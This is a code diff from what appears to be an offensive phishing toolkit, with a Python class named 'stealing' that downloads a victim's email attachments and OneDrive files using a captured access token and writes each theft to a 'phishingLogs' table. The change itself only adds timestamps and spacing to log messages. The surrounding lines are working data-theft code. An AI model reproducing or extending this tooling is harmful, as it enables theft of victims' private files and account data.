@@ -214,7 +214,7 @@ class stealing():
                                                     )
                     db.session.add(insertAttachments)
                     
-                    log = ('<br><span style="color:#7FFFD4">'+str(attachment_name)+'</span>')
+                    log = ('<br><span style="color:#7FFFD4">'+str(datetime.now())+' '+str(attachment_name)+'</span>')
                     db.session.add(phishingLogs(uuid=uuid, message=log))
                     db.session.commit()
 
@@ -305,7 +305,7 @@ class stealing():
             extension = extension.replace(".", '')
 
             if extension in config.extension or config.extension == "*" or config.extension == "":
-                log = ('<br><span style="color:#7FFFD4">[+] '+str(datetime.now())+str(name)+'</span>')
+                log = ('<br><span style="color:#7FFFD4">[+] '+str(datetime.now())+' '+str(name)+'</span>')
                 db.session.add(phishingLogs(uuid=uuid, message=log))
                 
                 content = requests.get(url, allow_redirects=True).content
@@ -391,7 +391,7 @@ class stealing():
                 
                 try:
                     for item in response['value']:
-                        log = ('<br><span style="color:#7FFFD4">[+] '+str(datetime.now())+item['name']+'</span>')
+                        log = ('<br><span style="color:#7FFFD4">[+] '+str(datetime.now())+' '+item['name']+'</span>')
                         db.session.add(phishingLogs(uuid=uuid, message=log))
                         db.session.commit()
                         threading.Thread(target=stealing.downloadOndriveFiles, name="Service Principle", args=(uuid, item, config, victim, accessToken)).start()
@@ -448,7 +448,7 @@ class stealing():
                     db.session.rollback()
                     #print("OneDrive " + str(e))
 
-                log = ('<br><span style="color:#7FFFD4">[+] '+str(datetime.now())+filename+' Downloaded!</span>')
+                log = ('<br><span style="color:#7FFFD4">[+] '+str(datetime.now())+' '+filename+' Downloaded!</span>')
                 db.session.add(phishingLogs(uuid=uuid, message=log))
                 db.session.commit()
 
